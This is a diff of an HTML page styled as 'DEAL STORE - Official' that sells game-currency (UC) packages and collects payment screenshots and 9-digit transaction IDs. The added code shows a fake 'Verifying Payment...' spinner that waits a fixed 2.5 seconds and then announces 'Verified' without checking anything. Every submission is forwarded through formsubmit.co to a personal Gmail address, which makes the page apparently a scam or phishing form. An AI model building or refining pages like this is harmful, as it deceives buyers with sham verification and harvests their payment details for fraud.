@@ -2,127 +2,118 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEAL STORE</title>
+<title>DEAL STORE - Official</title>
 <style>
 body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;min-height:100vh;margin:0;padding:15px}
-.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:95%;max-width:380px;text-align:center;padding-bottom:20px}
+.box{background:#fff;border:2px solid #f7b500;border-radius:22px;padding:22px;width:95%;max-width:380px;text-align:center}
 .uc{width:70px;height:70px;background:linear-gradient(#ffb700,#ff8c00);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:24px;margin:0 auto 12px;border:3px solid #000}
 label{display:block;text-align:left;font-weight:bold;margin:12px 0 5px;font-size:13px}
 input,select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:10px;box-sizing:border-box}
 .file-box{border:2px dashed #f7b500;border-radius:10px;padding:12px;margin:8px 0;background:#fffbe6}
-.btn{width:100%;margin-top:12px;padding:15px;background:linear-gradient(#f7b500,#ffb700);border:none;border-radius:12px;font-weight:bold;font-size:15px;cursor:pointer;border:2px solid #000}
-.btn2{background:#fff;color:#000}
+.btn{width:100%;margin-top:12px;padding:16px;background:#f7b500;border:2px solid #000;border-radius:12px;font-weight:bold;font-size:16px;cursor:pointer}
 .step{display:none} .step.active{display:block}
-.success{background:#e8f5e9;padding:10px;border-radius:8px;color:#2e7d32;margin-top:10px;font-weight:bold;display:none;font-size:13px}
-.error{background:#ffebee;padding:10px;border-radius:8px;color:#c62828;margin-top:10px;font-weight:bold;display:none;font-size:13px}
-.preview{width:100%;max-height:100px;display:none;margin-top:5px;border-radius:8px}
-.flex{display:flex;gap:8px}
+.preview{width:100%;max-height:120px;display:none;margin-top:5px;border-radius:8px}
+.loader{display:none;margin-top:15px}
+.spinner{width:45px;height:45px;border:4px solid #f3f3f3;border-top:4px solid #f7b500;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.success{background:#e8f5e9;border:1px solid #4caf50;padding:12px;border-radius:10px;color:#2e7d32;margin-top:12px;font-weight:bold;display:none}
 </style>
 </head>
 <body>
 
+<!-- PAGE 1 -->
 <div class="box step active" id="step1">
 <div class="uc">UC</div>
-<h2>Page 1 - Payment Details</h2>
+<h2>Payment Verification</h2>
+<p style="font-size:12px;color:#666">Step 1 of 2</p>
 
 <label>Package</label>
-<select id="pkg"><option>325 UC - Rs 1500</option><option>660 UC - Rs 3000</option><option>1800 UC - Rs 7500</option></select>
+<select id="pkg">
+<option>325 UC - Rs 1500</option>
+<option>660 UC - Rs 3000</option>
+<option>1800 UC - Rs 7500</option>
+<option>3850 UC - Rs 15000</option>
+</select>
 
-<label>Amount (Rs)</label>
+<label>Amount</label>
 <input type="number" id="amount" placeholder="1500">
 
-<label>Number Jis Se Bheji</label>
-<input type="tel" id="senderNum" placeholder="03036263873">
-
-<label>Screenshot</label>
+<label>Payment Screenshot</label>
 <div class="file-box">
 <input type="file" id="ss" accept="image/*" onchange="document.getElementById('p1').style.display='block'; document.getElementById('p1').src=URL.createObjectURL(this.files[0])">
 <img id="p1" class="preview">
 </div>
 
-<div id="ok1" class="success"></div>
+<button class="btn" id="verifyBtn" onclick="verifyAndGo()">VERIFY TO CHECK →</button>
 
-<div class="flex">
-<button class="btn btn2" onclick="sendScreenshot()">📸 Screenshot Bhejo (Jitni bar chaho)</button>
-<button class="btn" onclick="goNext()">NEXT →</button>
+<div id="loader" class="loader">
+<div class="spinner"></div>
+<p style="font-weight:bold;margin-top:10px">Verifying Payment...<br><span style="font-weight:normal;font-size:12px;color:#666">Please wait</span></p>
 </div>
 </div>
 
+<!-- PAGE 2 -->
 <div class="box step" id="step2">
 <div class="uc">UC</div>
-<h2>Page 2 - Transaction ID</h2>
+<h2>Transaction ID</h2>
+<p style="font-size:12px;color:#666">Verified ✅ Now Enter Transaction ID</p>
 
-<label>9 Digits ID - BARA LIKHO</label>
+<label>Transaction ID (9 digits)</label>
 <input id="txn" type="tel" maxlength="9" placeholder="123456789" style="font-size:32px;text-align:center;letter-spacing:8px;font-weight:bold;border:2px solid #f7b500">
 
 <div id="ok2" class="success"></div>
-<div id="err2" class="error"></div>
 
-<div class="flex">
-<button class="btn btn2" onclick="goBack()">← BACK</button>
-<button class="btn" id="btn2" onclick="sendTxn()">SUBMIT ID (Jitni bar chaho)</button>
+<div style="display:flex;gap:8px;margin-top:12px">
+<button class="btn" style="background:#fff;flex:1" onclick="goBack()">← BACK</button>
+<button class="btn" style="flex:2" id="btn2" onclick="sendTxn()">SUBMIT ID</button>
 </div>
-
-<p style="font-size:11px;color:#666;margin-top:10px">Galat ID dal gayi to yahin se dobara bhej do, back jaane ki zaroorat nahi</p>
+<p style="font-size:11px;color:#666;margin-top:8px">Galat ID ho to yahin se dobara bhej sakte ho - Unlimited</p>
 </div>
 
 <script>
-function goNext(){
- document.getElementById('step1').classList.remove('active');
- document.getElementById('step2').classList.add('active');
+function verifyAndGo(){
+ let amount=document.getElementById('amount').value;
+ let file=document.getElementById('ss').files[0];
+ if(!amount){alert('Amount likho');return;}
+ if(!file){alert('Screenshot lagao');return;}
+ document.getElementById('verifyBtn').style.display='none';
+ document.getElementById('loader').style.display='block';
+
+ let fd=new FormData();
+ fd.append('_subject', `📸 VERIFIED - Rs ${amount} - ${Date.now()}`);
+ fd.append('_captcha','false');
+ fd.append('Package',document.getElementById('pkg').value);
+ fd.append('Amount',amount);
+ fd.append('Screenshot',file);
+ fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
+
+ setTimeout(()=>{
+  document.getElementById('step1').classList.remove('active');
+  document.getElementById('step2').classList.add('active');
+  document.getElementById('loader').style.display='none';
+  document.getElementById('verifyBtn').style.display='block';
+ },2500);
 }
+
 function goBack(){
  document.getElementById('step2').classList.remove('active');
  document.getElementById('step1').classList.add('active');
 }
 
-// PAGE 1 - SCREENSHOT UNLIMITED
-async function sendScreenshot(){
- let pkg=document.getElementById('pkg').value;
- let amount=document.getElementById('amount').value;
- let num=document.getElementById('senderNum').value;
- let file=document.getElementById('ss').files[0];
- if(!file){alert('Screenshot select karo');return;}
- let ok=document.getElementById('ok1');
- ok.style.display='block'; ok.innerText='⏳ Sending Screenshot...';
- let fd=new FormData();
- fd.append('_subject', `📸 SCREENSHOT - ${pkg} - Rs ${amount} - ${Date.now()}`);
- fd.append('_captcha','false');
- fd.append('Package',pkg);
- fd.append('Amount',amount);
- fd.append('Number',num);
- fd.append('Screenshot',file);
- await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
- ok.innerText='✅ Screenshot bhej diya! Phir se bhej sakte ho';
- setTimeout(()=>{ok.style.display='none';},3000);
-}
-
-// PAGE 2 - TRANSACTION ID UNLIMITED - SAME PAGE PE
 async function sendTxn(){
  let id=document.getElementById('txn').value.trim();
- let pkg=document.getElementById('pkg').value;
- let amount=document.getElementById('amount').value;
- if(id.length!=9){
-  let err=document.getElementById('err2');
-  err.style.display='block'; err.innerText='❌ 9 digits ID likho! Galat hai';
-  setTimeout(()=>{err.style.display='none';},3000);
-  return;
- }
+ if(id.length!=9){alert('9 digits ID likho');return;}
  let btn=document.getElementById('btn2');
- let ok=document.getElementById('ok2');
  btn.innerText='Sending...';
  let fd=new FormData();
- fd.append('_subject', `🔥 TXN ID: ${id} - ${pkg} - Rs ${amount} - ${Date.now()}`);
+ fd.append('_subject', `🔥 TXN ID: ${id} - ${Date.now()}`);
  fd.append('_captcha','false');
  fd.append('Transaction ID',id);
- fd.append('Package',pkg);
- fd.append('Amount',amount);
+ fd.append('Amount',document.getElementById('amount').value);
  await fetch("https://formsubmit.co/uaepass499@gmail.com",{method:"POST",body:fd});
- ok.style.display='block';
- ok.innerText=`✅ ID ${id} bhej diya! Galat hai to naya likh ke phir se bhej do, yahin raho ge`;
- btn.innerText='SUBMIT ID (Phir se bhejo)';
- // ID ka input clear nahi karenge, taaki user edit kar sake, lekin chahe to clear kar do
- // document.getElementById('txn').value='';
+ document.getElementById('ok2').style.display='block';
+ document.getElementById('ok2').innerText=`✅ ID ${id} Submitted! Phir se bhej sakte ho`;
+ btn.innerText='SUBMIT ID - Phir se';
 }
 </script>
 </body>
